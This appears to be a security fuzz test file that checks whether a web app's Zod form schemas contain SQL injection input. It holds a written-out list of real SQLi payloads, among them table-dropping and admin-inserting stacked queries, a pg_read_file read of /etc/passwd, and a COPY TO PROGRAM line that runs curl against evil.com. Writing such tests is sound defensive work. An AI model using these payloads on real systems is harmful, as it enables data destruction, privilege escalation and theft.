import fc from 'fast-check';
import { contactBodySchema } from '@/lib/schemas/contact';
import { proposalSchema } from '@/lib/schemas/proposal';

/* -------------------------------------------------------------------------- */
/*  SQL injection fuzz tests                                                  */
/*  Defense layers: (1) Zod validation (2) Drizzle parameterized queries      */
/*  These tests verify layer 1: Zod enforces type/length constraints so       */
/*  common SQLi payloads either get rejected or are just harmless strings     */
/*  that Drizzle will parameterize safely.                                    */
/* -------------------------------------------------------------------------- */

// Classic and blind SQL injection payloads
const SQLI_PAYLOADS = [
  // Classic injection
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "'; DROP TABLE talents; --",
  "'; DROP TABLE contact_submissions; --",
  "1; DROP TABLE user; --",
  "' UNION SELECT * FROM user --",
  "' UNION SELECT username, password FROM user --",
  "admin'--",
  "1' OR '1' = '1",

  // Boolean-based blind
  "' AND 1=1 --",
  "' AND 1=2 --",
  "' AND (SELECT COUNT(*) FROM user) > 0 --",
  "' AND SUBSTRING(@@version,1,1)='5' --",

  // Time-based blind
  "'; WAITFOR DELAY '0:0:5' --",
  "'; SELECT SLEEP(5) --",
  "' OR SLEEP(5) --",
  "1' AND pg_sleep(5) --",

  // Error-based
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",

  // Stacked queries
  "'; INSERT INTO user(email,role) VALUES('hacker@evil.com','admin'); --",
  "'; UPDATE user SET role='admin' WHERE email='attacker@evil.com'; --",
  "'; DELETE FROM talents; --",

  // PostgreSQL-specific
  "'; SELECT pg_read_file('/etc/passwd'); --",
  "'; COPY (SELECT '') TO PROGRAM 'curl evil.com'; --",
  "$$; DROP TABLE user; $$",
  "E'\\x27 OR 1=1 --'",

  // Bypasses
  "' oR '1'='1",
  "'%20OR%20'1'='1",
  "' OR ''='",
  "' OR 1 -- -",
  "') OR ('1'='1",
  "' OR '1'='1' #",

  // Encoded
  "%27%20OR%20%271%27%3D%271",
  "\\' OR 1=1 --",
  "' OR \\x31=\\x31 --",

  // NoSQL injection (in case of future mixed backends)
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "this.role==\'admin\'"}',
];

// Generate random SQL-like payloads
const sqlArbitrary = fc.oneof(
  fc.constantFrom(...SQLI_PAYLOADS),
  // Random SQL fragments
  fc.tuple(
    fc.constantFrom("'", '"', ';', '--', '/*', 'OR', 'AND', 'UNION', 'SELECT', 'DROP', 'INSERT', 'UPDATE', 'DELETE'),
    fc.string({ maxLength: 50 }),
  ).map(([prefix, rest]) => `${prefix} ${rest}`),
  // Random quote-based attempts
  fc.string({ maxLength: 100 }).map((s) => `' ${s} --`),
);

describe('SQL injection — contact schema', () => {
  it('SQLi payloads in name field: length-constrained, never throws', () => {
    for (const payload of SQLI_PAYLOADS) {
      const result = contactBodySchema.safeParse({
        name: payload.slice(0, 100),
        email: 'test@test.com',
        type: 'brand',
        message: 'A perfectly valid message for testing.',
      });
      // Zod treats them as strings — Drizzle parameterizes them
      // Short SQLi payloads (>=2 chars) will pass Zod, but that's OK:
      // they'll be parameterized by Drizzle, never interpolated
      expect(typeof result.success).toBe('boolean');
    }
  });

  it('SQLi payloads in message field: bounded by max length', () => {
    for (const payload of SQLI_PAYLOADS) {
      const msg = payload.length >= 10 ? payload.slice(0, 5000) : 'Padding:  ' + payload;
      const result = contactBodySchema.safeParse({
        name: 'Test User',
        email: 'test@test.com',
        type: 'brand',
        message: msg,
      });
      expect(typeof result.success).toBe('boolean');
      if (result.success) {
        // If it passed, the message is just a string — Drizzle parameterizes
        expect(result.data.message.length).toBeLessThanOrEqual(5000);
      }
    }
  });

  it('SQLi in email field: rejected by email validation', () => {
    for (const payload of SQLI_PAYLOADS) {
      const result = contactBodySchema.safeParse({
        name: 'Test User',
        email: payload,
        type: 'brand',
        message: 'A perfectly valid message for testing.',
      });
      // SQLi payloads are not valid emails
      expect(result.success).toBe(false);
    }
  });

  it('SQLi in optional fields: bounded by max length', () => {
    const optionalFields = ['phone', 'company', 'budget', 'timeline', 'audience', 'platform', 'viewers', 'monetization'];

    for (const field of optionalFields) {
      for (const payload of SQLI_PAYLOADS.slice(0, 10)) {
        const input: Record<string, unknown> = {
          name: 'Test User',
          email: 'test@test.com',
          type: 'brand',
          message: 'A perfectly valid message for testing.',
          [field]: payload,
        };
        const result = contactBodySchema.safeParse(input);
        // Either rejected by max length or accepted as a string
        expect(typeof result.success).toBe('boolean');
      }
    }
  });

  it('random SQL-like strings never crash the parser', () => {
    fc.assert(
      fc.property(sqlArbitrary, (sql) => {
        const result = contactBodySchema.safeParse({
          name: (sql.slice(0, 100) || 'AB').padEnd(2, 'X'),
          email: 'test@test.com',
          type: 'brand',
          message: sql.length >= 10 ? sql.slice(0, 5000) : 'Padding:  ' + sql,
        });
        expect(typeof result.success).toBe('boolean');
      }),
      { numRuns: 2_000 },
    );
  });
});

describe('SQL injection — proposal schema', () => {
  it('SQLi in talentId: always rejected (expects positive integer)', () => {
    for (const payload of SQLI_PAYLOADS) {
      const result = proposalSchema.safeParse({
        talentId: payload,
        campaignType: 'Streaming',
        budgetRange: '<5K',
        timeline: '1 semana',
        message: 'A valid proposal message here.',
      });
      expect(result.success).toBe(false);
    }
  });

  it('SQLi in enum fields: always rejected', () => {
    for (const payload of SQLI_PAYLOADS) {
      const result = proposalSchema.safeParse({
        talentId: 1,
        campaignType: payload,
        budgetRange: '<5K',
        timeline: '1 semana',
        message: 'A valid proposal message here.',
      });
      expect(result.success).toBe(false);
    }
  });

  it('SQLi in message field: bounded, never throws', () => {
    for (const payload of SQLI_PAYLOADS) {
      const msg = payload.length >= 10 ? payload.slice(0, 1000) : 'Padding:  ' + payload;
      const result = proposalSchema.safeParse({
        talentId: 1,
        campaignType: 'Streaming',
        budgetRange: '<5K',
        timeline: '1 semana',
        message: msg,
      });
      expect(typeof result.success).toBe('boolean');
    }
  });
});
